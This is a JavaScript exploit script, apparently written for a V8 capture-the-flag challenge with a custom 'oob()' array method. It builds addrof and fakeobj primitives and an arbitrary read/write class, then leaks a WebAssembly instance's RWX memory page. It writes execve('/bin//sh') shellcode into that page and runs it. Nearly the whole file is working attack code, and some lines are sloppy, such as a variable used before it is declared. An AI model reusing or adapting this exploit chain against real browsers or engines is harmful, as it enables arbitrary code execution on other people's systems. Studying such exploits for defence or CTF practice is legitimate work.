class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt((val % 0x100000000));
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
}
let mem = new Memory();




var vicbuff = new ArrayBuffer(0x456);
var vicobj = {mark:0xaaaa};
var a = [vicobj];
// var a = [vicbuff];
var b = [1.1];
var fakeobject = [
    mem.u2f(floatarrmmap),
    0,
    mem.u2f(floatarrmmap),
    mem.u2f(0x400000000),
    1.1,
    1.2
];

var objarrmmap = mem.f2u(a.oob());
var floatarrmmap = mem.f2u(b.oob());

fakeobject[0] = mem.u2f(floatarrmmap);
fakeobject[1] = 1.1;
fakeobject[2] = mem.u2f(0x41414141);
fakeobject[3] = mem.u2f(0x4000000000);
// fakeobject[4] = mem.u2f(0x41414141);


console.log("[*] obj arr map is 0x" + objarrmmap.toString(16));
console.log("[*] float arr map is 0x" + floatarrmmap.toString(16));


class Leakobj{
    addrof(obj){
        a[0] = obj;
        a.oob(mem.u2f(floatarrmmap));
        let objaddr = mem.f2u(a[0]) - 1;
        a.oob(mem.u2f(objarrmmap));
        return objaddr;
    }
    fakeobjectof(add_to_object){
        b[0] = mem.u2f(add_to_object + 1);
        b.oob(mem.u2f(objarrmmap));
        let tmp = b[0];
        b.oob(floatarrmmap);
        return tmp;
    }
}

objinfo = new Leakobj();


var fakeobjaddr = objinfo.addrof(fakeobject) - 0x40 + 0x10;
console.log("[*] Leak fake obj is 0x" + fakeobjaddr.toString(16));



var fakeobj = objinfo.fakeobjectof(fakeobjaddr);


class arwMemory{
    read(addr){
        fakeobject[2] = mem.u2f(addr - 0x10 + 1);
        return mem.f2u(fakeobj[0])
    }
    write(addr, data){
        fakeobject[2] = mem.u2f(addr - 0x10 + 1);
        fakeobj[0] = mem.u2f(data);
    }
}

arw = new arwMemory();

let fixmmap = arw.read(fakeobjaddr+ 0x38) ;
console.log("Leak fix mmap is 0x" + fixmmap.toString(16));
fakeobject[1] = mem.u2f(fixmmap);

let leak = objinfo.addrof(vicbuff);
let leakheap = arw.read(leak + 0x20);
console.log("leka heap is 0x" + leakheap.toString(16));





var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.test;


let leakfun = objinfo.addrof(f) + 1;
console.log("[*] leak function addr is 0x" + leakfun.toString(16));
let shared_info = arw.read(leakfun - 1 + 0x18);
console.log("[*] leak shared_info is 0x" + shared_info.toString(16));
let Wasmdata = arw.read(shared_info - 1 + 0x8);
console.log("[*] leak Wasmdata addr is 0x" + Wasmdata.toString(16));
let instance_addr = arw.read(Wasmdata - 1 + 0x10);
console.log("[*] leak instance addr is 0x" + instance_addr.toString(16));
let rwxmap = arw.read(instance_addr - 1 + 0x88)
console.log("[*] leak rwx map is 0x" + rwxmap.toString(16));

let sc = [0x50,0x48,0x31,0xc0,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xb0,0x3b,0x0f,0x05];


var data_buf = new ArrayBuffer(0x128);
var data_view = new DataView(data_buf);
var shellcodepoint = objinfo.addrof(data_buf) + 0x20;
console.log("shellcode point is 0x" + shellcodepoint.toString(16));


arw.write(shellcodepoint,rwxmap);

// data_view.set(sc);


for(let i = 0; i < sc.length; i++){
    data_view.setUint8(i,sc[i],true);
}

// %DebugPrint(a);
// %DebugPrint(vicobj);
// %DebugPrint(fakeobject);
// %DebugPrint(vicbuff);
//
// %SystemBreak();


f();



